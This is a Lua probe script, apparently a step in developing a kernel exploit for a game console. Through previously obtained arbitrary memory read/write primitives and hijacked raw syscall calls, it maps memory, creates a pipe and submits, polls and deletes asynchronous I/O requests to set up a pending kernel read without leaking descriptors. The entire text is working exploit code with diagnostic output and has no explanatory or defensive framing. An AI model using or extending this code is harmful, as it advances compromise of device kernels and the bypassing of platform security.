-- CRASH_CLASS: MODERATE
-- PROBE 874b: find a pending-read source that does not leak fds (socketpair is exhausted)
print("=== PROBE 874b: pipe as the pending source ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local page=0x4000
local function mmap(px) local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local fds=mmap(0x100)
local D=mmap(page); local ids=mmap(page); local st=mmap(page); local out=mmap(page)
local bufp=mmap(page); local res=mmap(page)
-- 1. pipe via a pointer argument
wd(fds,0xFFFFFFFF); wd(fds+4,0xFFFFFFFF)
local okp,rvp=pcall(function() return mk(42)(uint64(fds),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
local fr,fw=rd(fds),rd(fds+4)
print(string.format("[A] pipe ok=%s rv=%s fds=%s/%s", tostring(okp), tostring(rvp), tostring(fr), tostring(fw)))
local fd = fr
if not (fr and fr >= 0 and fr < 0x1000) then
    print("[A] pipe unusable")
else
    wq(D,uint64(0)); wq(D+0x08,uint64(0x1000)); wq(D+0x10,uint64(bufp)); wq(D+0x18,uint64(res)); wd(D+0x20,fd); wd(D+0x24,0)
    local okc,rvc=pcall(function() return mk(669)(uint64(0x1001),uint64(D),uint64(1),uint64(1),uint64(out)) end)
    local id=rd(out) or 0
    wd(ids,id); pcall(function() mk(664)(uint64(ids),uint64(1),uint64(st)) end)
    print(string.format("[B] create=%s rv=%s id=%08X state=%08X", tostring(okc), tostring(rvc), id, rd(st) or 0))
    if id ~= 0 then
        pcall(function() mk(4)(uint64(fw),uint64(bufp),uint64(1),uint64(0),uint64(0)) end)
        pcall(function() mk(240)(uint64(0),uint64(0)) end)
        local t=memory.alloc(16); wq(t,0); wq(t+8,20000000); pcall(function() mk(240)(uint64(t),uint64(0)) end)
        wd(ids,id); pcall(function() mk(664)(uint64(ids),uint64(1),uint64(st)) end)
        print(string.format("[C] after write state=%08X", rd(st) or 0))
        wd(ids,id); pcall(function() mk(662)(uint64(ids),uint64(1),uint64(st)) end)
        print(string.format("[D] delete=%08X", rd(st) or 0))
    end
end
print("[Z] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
